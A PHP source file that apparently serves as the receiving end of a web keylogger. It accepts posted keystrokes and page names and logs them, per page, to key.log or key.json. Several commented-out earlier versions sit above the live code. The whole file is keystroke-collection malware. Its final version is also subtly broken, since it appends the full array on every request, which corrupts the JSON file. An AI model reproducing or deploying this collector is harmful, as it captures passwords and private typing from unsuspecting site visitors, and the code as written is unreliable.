<?php
	
// 	session_start();

// 	if (!isset($_POST['key'])) {
// 		echo "Access Dinied";
// 		exit();
// 	}

// 	$file = fopen("key.log", "a+");

// 	if (!isset($_SESSION['page']) || $_SESSION['page'] != $_POST['page']) {
// 		$_SESSION['page'] = $_POST['page'];
// 		fwrite($file, "\n=========================");
// 		fwrite($file, "\nPage: ".$_POST['page']."\n");
// 		fwrite($file, "Key: ");
// 	}

// 	fwrite($file, $_POST['key']);
// 	fclose($file);

// 	echo "Char Saved!";
// // ASLI WORK


// session_start();

// if (!isset($_POST['key'])) {
//     echo "Access Denied";
//     exit();
// }

// $file = fopen("key.json", "a+");

// if (!isset($_SESSION['page']) || $_SESSION['page'] != $_POST['page']) {
//     $_SESSION['page'] = $_POST['page'];
//     fwrite($file, json_encode($_POST) . "\n");
// } else {
//     fwrite($file, json_encode($_POST) . "\n");
// }

// fclose($file);

// echo "Char Saved!";



// session_start();

// if (!isset($_POST['key'])) {
//     echo "Access Denied";
//     exit();
// }

// $file = fopen("key.json", "a+");

// if (!isset($_SESSION['page']) || $_SESSION['page'] != $_POST['page']) {
//     $_SESSION['page'] = $_POST['page'];
//     $data = array();
//     $data[] = $_POST;
//     fwrite($file, json_encode($data) . "\n");
// } else {
//     $data = array();
//     $data[] = $_POST;
//     fwrite($file, json_encode($data) . "\n");
// }

// fclose($file);

// echo "Char Saved!";

session_start();

if (!isset($_POST['key'])) {
    echo "Access Denied";
    exit();
}

$file = fopen("key.json", "a+");

if (!isset($_SESSION['page']) || $_SESSION['page'] != $_POST['page']) {
    $_SESSION['page'] = $_POST['page'];
    $data = array();
} else {
    $data = json_decode(file_get_contents("key.json"), true); // Load existing data from the file
}

$data[] = $_POST; // Add the new data entry to the array

fwrite($file, json_encode($data, JSON_PRETTY_PRINT) . "\n"); // Write the entire array as a JSON object to the file with JSON_PRETTY_PRINT option for formatting

fclose($file);

echo "Char Saved!";



?>